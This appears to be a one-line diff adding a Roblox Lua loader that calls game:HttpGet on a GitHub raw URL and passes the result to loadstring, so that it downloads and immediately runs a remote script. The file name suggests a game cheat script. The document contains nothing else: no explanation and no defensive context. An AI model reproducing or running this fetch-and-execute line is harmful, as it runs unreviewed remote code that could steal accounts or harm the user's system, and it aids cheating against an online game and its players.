@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/1-speed-keyboard-escape-candy-chocolate-spam5-me75hnlio2zg0i.lua"))()
